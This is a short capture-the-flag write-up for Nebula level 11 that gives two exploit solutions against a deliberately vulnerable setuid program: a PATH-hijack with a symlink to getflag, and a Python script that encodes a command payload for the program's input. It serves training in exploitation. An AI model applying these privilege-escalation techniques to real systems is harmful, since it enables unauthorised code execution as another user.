.. _nebula11:

.. role:: bash(code)
	  :language: bash

.. role:: python(code)
	  :language: python

Nebula 11
=========

Basic Information
-----------------

**Home Page** https://exploit-exercises.com/nebula/level11/

Important Note
----
   
This level has two posible ways to be exploited but, it have a bug on the sticky bit, this bug can be seen by strace

**Reported bug:** https://security.stackexchange.com/questions/137204/nebula-level11-setuid-is-not-working

Solution
--------
* First way:

.. code-block:: bash

   export PATH=/tmp/:$PATH
   ln -s /bin/getflag d
   echo -ne "Content-Length: 1\nd" | /home/flag11/flag11

.. note:: Execute it until an "e" comes up, if this letter shows then you can execute

* Second way:

.. code-block:: python

   string = "/bin/getflag\x00"
   key = 0

   enc_string = ""

   for char in string:
       enc_char = ord(char) ^ key & 0xff
       enc_string += chr(enc_char)
       key = key - ord(char) & 0xff

   print "Content-Length: 1024\n" + enc_string + "\x00" * (1024 - len(enc_string))
